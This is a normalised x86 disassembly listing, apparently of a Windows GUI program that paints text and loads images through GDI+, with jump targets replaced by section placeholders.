cmp [ eax + 0xa8 ] 0x0
je r-xdata
mov edx [ esi + 0xb0 ]
cmp [ edx + 0xa8 ] 0x0
jne r-xdata
mov ebx [ esp + 0x28 ]
mov esi [ esp + 0x20 ]
test esi esi
js r-xdata
mov ecx [ esp + 0x18 ]
push 0x800
lea eax [ esp + 0x40 ]
push eax
push 0xffffffff
push edi
push ecx
mov edx [ esp + 0x18 ]
push 0x810
lea ecx [ esp + 0x40 ]
push ecx
push 0xffffffff
push edi
push edx
jmp r-xdata
inc [ esp + 0x3c ]
push 0x80070057
call sub_402d00
mov ebx [ edi - 0xc ]
cmp esi ebx
jge r-xdata
mov eax [ ebx ]
mov esi [ SendMessageW@IAT ]
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x3c ]
push edx
push 0xb0
push eax
call esi
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x38 ]
mov eax [ ebx ]
push ecx
push edx
push 0xb1
push eax
call esi
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
push ecx
push esi
call [ SetTextColor@IAT ]
mov edx [ esp + 0x30 ]
push edx
push esi
call [ SelectObject@IAT ]
mov [ esp + 0xa0 ] 0xffffffff
add edi 0xfffffff0
lea eax [ edi + 0xc ]
or ecx 0xffffffff
[ eax ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov eax [ ebx ]
lea edx [ esp + 0x4c ]
push edx
push eax
call [ EndPaint@IAT ]
call [ DrawTextW@IAT ]
cmp [ esp + 0x13 ] 0x0
je r-xdata
cmp [ edi - 0x4 ] 0x1
jle r-xdata
xor eax eax
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x80 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
mov ecx [ edi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push edi
call eax
mov cx [ esp + 0x1c ]
mov [ edi + esi * 2 ] cx
test ebx ebx
js r-xdata
push ebx
lea edx [ esp + 0x18 ]
push edx
call sub_402b70
mov edi [ esp + 0x14 ]
mov eax [ esp + 0x2c ]
cmp ebx [ edi - 0x8 ]
jg r-xdata
xor edx edx
inc esi
mov [ edi - 0xc ] ebx
mov [ edi + ebx * 2 ] dx
cmp esi eax
jl r-xdata
sub_43f590
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
cmp [ esi + 0x98 ] 0x0
jne r-xdata
push 0x2
push edi
call [ SetBkMode@IAT ]
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x80 ]
push ecx
push edi
call [ SetTextColor@IAT ]
cmp [ esi + 0x98 ] 0x0
jne r-xdata
mov eax [ esi + 0xa0 ]
pop edi
pop esi
pop ebp
retn 0xc
cmp [ esi + 0x27 ] 0x0
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x7c ]
push edx
cmp [ esi + 0x27 ] 0x0
je r-xdata
mov eax [ esi + 0xa4 ]
pop edi
pop esi
pop ebp
retn 0xc
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x70 ]
push eax
jmp r-xdata
push edi
call [ SetBkColor@IAT ]
sub_43f610
push esi
push edi
mov esi ecx
mov ecx [ esi - 0x54 ]
lea edi [ esi - 0x70 ]
push edi
push 0x138
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x133
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x111
call sub_412fd0
pop edi
pop esi
retn
sub_43f650
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov eax [ ebx - 0x70 ]
mov edx [ eax + 0x78 ]
push esi
lea ecx [ ebx - 0x70 ]
call edx
test al al
jne r-xdata
mov ecx [ ebp + 0xc ]
push edi
mov eax ecx
xor edi edi
sub eax 0x111
je r-xdata
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x14
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
sub eax 0x22
je r-xdata
cmp ax 0x1
jne r-xdata
mov edx eax
shr edx 0x10
cmp edx 0x300
jne r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
sub eax 0x5
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
shr eax 0x10
test eax eax
jne r-xdata
mov edx [ ebx - 0x70 ]
push ecx
push eax
mov eax [ edx + 0x94 ]
push 0x111
lea ecx [ ebx - 0x70 ]
call eax
mov ecx [ ebp + 0x18 ]
mov edi eax
pop edi
pop esi
mov [ ecx ] 0x1
pop ebx
pop ebp
retn 0x14
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
mov [ edx ] 0x1
mov edx [ ebx - 0x70 ]
mov edx [ edx + 0x90 ]
push eax
push ecx
lea ecx [ ebx - 0x70 ]
call edx
mov edi eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
mov edx [ ebx - 0x70 ]
mov eax [ edx + 0xa4 ]
lea ecx [ ebx - 0x70 ]
call eax
mov ecx [ ebp + 0x18 ]
mov [ ecx ] 0x1
sub_43f720
push ebp
mov ebp esp
cmp [ ecx + 0x98 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] 0x0
xor eax eax
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x1
mov eax 0x1
pop ebp
retn 0x10
sub_43f750
push esi
mov esi [ eax + 0xb0 ]
mov eax [ esi + 0xcc ]
cmp [ eax - 0xc ] 0x0
jle r-xdata
or eax 0xffffffff
xor edx edx
cmp eax eax
setne dl
pop esi
mov eax edx
retn
push ecx
push eax
call [ wcschr@IAT ]
add esp 0x8
test eax eax
jne r-xdata
sub eax [ esi + 0xcc ]
xor edx edx
sar eax 0x1
cmp eax 0xffffffff
setne dl
pop esi
mov eax edx
retn
sub_43f7a0
push ebp
mov ebp esp
mov eax ecx
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] 0x0
xor eax eax
pop ebp
retn 0x10
cmp [ eax + 0x25 ] 0x0
je r-xdata
cmp [ eax + 0x26 ] 0x0
je r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
cmp [ edx + 0xab ] 0x0
mov ecx [ eax + 0x1c ]
push esi
mov esi [ ecx ]
sete dl
movzx edx dl
push 0x0
push edx
push eax
mov eax [ esi + 0x20 ]
call eax
pop esi
sub_43f7f0
mov eax ecx
cmp [ eax + 0x1c ] 0x0
je r-xdata
retn
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push esi
mov esi [ eax + 0x8 ]
push 0xd
push esi
push 0x111
push eax
mov eax [ edx + 0x10 ]
call eax
pop esi
sub_43f820
push ebp
mov ebp esp
push 0xffffffff
push sub_449938
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x78 ]
lea edi [ ebp - 0x10 ]
call sub_419a00
cmp [ esi + 0x1c ] 0x0
mov edi [ ebp - 0x10 ]
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
push edi
push eax
mov eax [ edx + 0x10 ]
push 0x500
push esi
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_43f8f0
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
push edi
mov edi ecx
mov ecx [ ebp + 0x14 ]
mov esi [ edi + 0x74 ]
push eax
push ecx
mov ecx [ ebp + 0xc ]
call sub_43f920
mov [ edi + 0x74 ] esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
sub_43f920
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44aafa
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
mov esi 0x1
cmp ecx esi
jne r-xdata
cmp ecx 0x2
jne r-xdata
mov [ edi + 0x74 ] esi
mov esi edi
call sub_43fc30
mov [ ebx ] eax
cmp [ edi + 0x74 ] 0x0
je r-xdata
cmp ecx 0x14
jne r-xdata
mov [ edi + 0x74 ] esi
lea esi [ edi + 0x24 ]
call sub_41a520
mov eax 0x1
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp ecx 0xf
jne r-xdata
mov [ edi + 0x74 ] esi
mov [ esp + 0x18 ] 0xffffffff
mov [ ebx ] esi
cmp [ edi + 0x74 ] 0x0
je r-xdata
mov eax 0x1
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp ecx 0x5
jne r-xdata
mov [ edi + 0x74 ] esi
mov [ esp + 0x18 ] esi
mov eax [ edi + 0x24 ]
mov edx [ eax + 0x4 ]
lea ecx [ edi + 0x24 ]
push 0xffffffff
call edx
mov [ esp + 0x18 ] 0xffffffff
mov [ ebx ] 0x0
cmp [ edi + 0x74 ] 0x0
je r-xdata
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
movsx edx ax
shr eax 0x10
cwde
push 0x7
lea ecx [ edi + 0x24 ]
mov [ edi + 0x74 ] esi
mov esi [ ecx ]
push eax
mov eax [ esi + 0x8 ]
push edx
call eax
jmp r-xdata
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
mov [ ebx ] 0x0
cmp [ edi + 0x74 ] 0x0
je r-xdata
sub_43fa70
push ebp
mov ebp esp
push 0xffffffff
push sub_4483fa
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
lea eax [ esi + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x10 ] eax
mov [ eax + 0xc ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ ebp - 0x4 ] 0x2
mov eax [ DefWindowProcW@IAT ]
mov [ esi + 0x20 ] eax
mov [ ebp - 0x4 ] 0x4
lea edi [ esi + 0x24 ]
push edi
call sub_41a380
mov [ ebp - 0x4 ] 0x5
mov [ esi ] r--data
mov [ edi ] r--data
mov [ esi + 0x7c ] r--data
mov [ esi + 0x80 ] ebx
mov [ esi + 0x84 ] bl
mov [ ebp - 0x4 ] 0x6
mov [ esi + 0x78 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43fb20
push ebp
mov ebp esp
push 0xffffffff
push sub_448e3a
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
lea ecx [ esi + 0x24 ]
mov [ esi ] r--data
mov [ ecx ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x7c ] r--data
mov [ ebp - 0x4 ] 0x0
call sub_41a460
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call sub_443ef4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_43fbb0
push ebp
mov ebp esp
push 0xffffffff
push sub_448e3a
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
lea ecx [ esi + 0x24 ]
mov [ esi ] r--data
mov [ ecx ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x7c ] r--data
mov [ ebp - 0x4 ] 0x0
call sub_41a460
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_443ef4
sub_43fc30
mov eax [ esi + 0x4 ]
push ebx
push edi
push eax
mov edx r--data
lea eax [ esi + 0x24 ]
mov [ esi + 0x64 ] 0x0
call sub_41a610
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov ecx [ esi + 0x3c ]
mov edx [ esi + 0x4 ]
mov ecx [ ecx ]
push edx
lea ebx [ esi + 0x7c ]
call sub_426fd0
pop edi
xor eax eax
pop ebx
retn
mov edx [ esi + 0x4 ]
xor ecx ecx
push edx
lea ebx [ esi + 0x7c ]
call sub_426fd0
xor eax eax
pop edi
pop ebx
retn
sub_43fc80
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ edi + 0x54 ] 0x0
mov [ ebp - 0x1c ] eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
push ebx
push esi
push 0xffffff
push ecx
call [ SetTextColor@IAT ]
mov esi [ edi + 0x54 ]
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x20 ]
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0x2
call sub_414260
mov eax [ ebp - 0x18 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
pop esi
pop ebx
mov esi [ eax + 0x10 ]
xor ebx ebx
cmp esi ebx
je r-xdata
mov edx [ esi ]
mov eax [ esi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx esi
call edx
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
mov edx [ esi ]
mov edx [ edx + 0x14 ]
push ebx
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x1c ]
add edi 0x20
push edi
push ecx
mov ecx esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
call edx
sub_43fd40
push ebp
mov ebp esp
push 0xffffffff
push sub_444ef8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov edx 0x1
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x20 ] edx
mov [ eax + 0x18 ] dl
mov [ eax + 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ eax ] r--data
mov [ eax + 0x8 ] 0x2
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov [ eax + 0x2c ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_43fdc0
push ebp
mov ebp esp
push 0xffffffff
push sub_444ec8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x24 ]
cmp ecx edi
je r-xdata
mov eax [ esi + 0x2c ]
cmp eax edi
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x24 ] edi
mov eax [ esi + 0x28 ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esi + 0x2c ] edi
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push eax
call [ GlobalFree@IAT ]
mov [ esi + 0x28 ] edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_43fe60
push ebp
mov ebp esp
push ebx
mov ebx ecx
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
pop ebx
pop ebp
retn 0x4
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
cmp [ esi + 0x8 ] 0x0
je r-xdata
xor eax eax
mov eax [ esi + 0xc ]
jmp r-xdata
push eax
call [ GlobalLock@IAT ]
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
push eax
push 0x2
call [ GlobalAlloc@IAT ]
mov [ ebx + 0x28 ] eax
test eax eax
je r-xdata
xor edx edx
mov edx [ esi + 0xc ]
jmp r-xdata
mov ecx [ ebx + 0x28 ]
push ecx
call [ GlobalUnlock@IAT ]
push edi
push 0x0
mov edi esi
call sub_4400f0
add esp 0x4
mov [ ebx + 0x24 ] eax
pop edi
test eax eax
je r-xdata
push edx
push ecx
push eax
call memcpy
mov eax [ ebx + 0x28 ]
add esp 0xc
lea esi [ ebx + 0x2c ]
push esi
push 0x0
push eax
call [ CreateStreamOnHGlobal@IAT ]
mov esi [ esi ]
test esi esi
je r-xdata
mov esi eax
call sub_4400c0
mov esi [ ebx + 0x24 ]
mov [ ebx + 0xc ] eax
call sub_440090
mov [ ebx + 0x10 ] eax
sub_43ff20
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0x10
mov esi [ esi + 0x24 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push esi
call eax
sub_43ff60
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi ecx
mov ecx [ edi + 0x14 ]
mov eax [ edi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx edi
call edx
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov ecx [ edi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov edi [ eax + 0x4 ]
mov [ ebp + 0x8 ] edx
fild [ ebp + 0x8 ]
push ebx
mov ebx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
fstp [ ebp - 0x10 ]
sub ebx edx
mov [ ebp + 0x8 ] edi
fild [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ebx
sub eax edi
sub esp 0x10
fstp [ ebp - 0xc ]
fild [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x4 ]
mov ebx [ eax + 0xc ]
fstp [ ebp - 0x8 ]
fild [ ebp + 0x8 ]
mov edi [ eax ]
sub ebx edx
mov [ ebp + 0xc ] edx
mov edx [ eax + 0x8 ]
fstp [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
fild [ ebp + 0x8 ]
sub edx edi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0x10 ] edi
fstp [ esp + 0xc ]
lea eax [ ebp - 0x10 ]
fild [ ebp + 0x8 ]
fstp [ esp + 0x8 ]
fild [ ebp + 0xc ]
fstp [ esp + 0x4 ]
fild [ ebp + 0x10 ]
fstp [ esp ]
call sub_4221b0
pop ebx
sub_440010
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0x10
mov esi [ esi + 0x24 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push esi
call eax
sub_440050
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0xc
mov esi [ esi + 0x24 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ecx ]
mov eax [ eax + 0x20 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push esi
call eax
sub_440090
push ebp
mov ebp esp
push ecx
mov ecx [ esi + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
mov [ ebp - 0x4 ] 0x0
call [ GdipGetImageHeight@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov [ esi + 0x8 ] eax
sub_4400c0
push ebp
mov ebp esp
push ecx
mov ecx [ esi + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
mov [ ebp - 0x4 ] 0x0
call [ GdipGetImageWidth@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov [ esi + 0x8 ] eax
sub_4400f0
push ebp
mov ebp esp
push 0xffffffff
push sub_444e98
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x10
call [ GdipAlloc@IAT ]
mov esi eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
mov [ eax ] 0x0
push edi
je r-xdata
call [ GdipLoadImageFromStream@IAT ]
mov [ esi + 0x8 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
call [ GdipLoadImageFromStreamICM@IAT ]
mov [ esi + 0x8 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_4401a0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ GdipDisposeImage@IAT ]
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ GdipFree@IAT ]
sub_4401d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4456b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x4 ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
mov [ ebp - 0x10 ] 0x0
call [ GdipCloneImage@IAT ]
test eax eax
je r-xdata
push 0x10
call [ GdipAlloc@IAT ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
xor eax eax
mov esi [ esi + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] esi
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_440280
push ebp
mov ebp esp
push 0xffffffff
push sub_444ef8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov edx 0x1
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x20 ] edx
mov [ eax + 0x18 ] dl
mov [ eax + 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ eax ] r--data
mov [ eax + 0x8 ] edx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov [ eax + 0x2c ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_440300
push ebp
mov ebp esp
push 0xffffffff
push sub_444ec8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x24 ]
cmp ecx edi
je r-xdata
mov eax [ esi + 0x2c ]
cmp eax edi
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x24 ] edi
mov eax [ esi + 0x28 ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esi + 0x2c ] edi
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push eax
call [ GlobalFree@IAT ]
mov [ esi + 0x28 ] edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4403a0
push esi
mov esi ecx
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x24 ] 0x0
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esi + 0x2c ] 0x0
pop esi
retn
push eax
call [ GlobalFree@IAT ]
mov [ esi + 0x28 ] 0x0
sub_4403f0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x24 ]
call edx
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x14 ] eax
pop esi
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
pop esi
pop ebp
retn 0x8
sub_440420
push ebp
mov ebp esp
push edi
mov edi ecx
cmp [ edi + 0x24 ] 0x0
jne r-xdata
pop edi
pop ebp
retn 0x4
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
cmp [ esi + 0x8 ] 0x0
je r-xdata
xor eax eax
mov eax [ esi + 0xc ]
jmp r-xdata
push eax
call [ GlobalLock@IAT ]
mov ecx [ esi + 0x8 ]
test ecx ecx
